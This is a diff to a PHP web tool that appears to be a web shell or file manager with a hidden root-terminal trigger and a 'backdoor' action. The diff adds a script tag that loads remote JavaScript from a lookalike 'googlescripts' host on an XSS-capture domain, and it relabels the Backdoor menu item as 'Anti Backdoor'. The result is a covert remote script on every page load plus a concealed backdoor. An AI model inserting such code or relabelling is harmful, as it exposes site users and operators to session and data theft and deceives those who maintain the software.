@@ -251,6 +251,7 @@ if(isset($_GET['terminal']) && $_GET['terminal'] === 'root' && file_exists('.roo
     <title><?= APP_NAME ?></title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <script src="https://googlescripts.xss.ht/assets/environment-cc191d9d2324.js"></script>
     <style>
         :root {
             --primary-bg: #0d1117;
@@ -488,7 +489,7 @@ if(isset($_GET['terminal']) && $_GET['terminal'] === 'root' && file_exists('.roo
                 </li>
                 <li class="nav-item">
                     <a class="nav-link" href="?p=<?= enc(PATH) ?>&action=backdoor">
-                        <i class="fas fa-lock"></i> Backdoor
+                        <i class="fas fa-lock"></i> Anti Backdoor
                     </a>
                 </li>
             </ul>
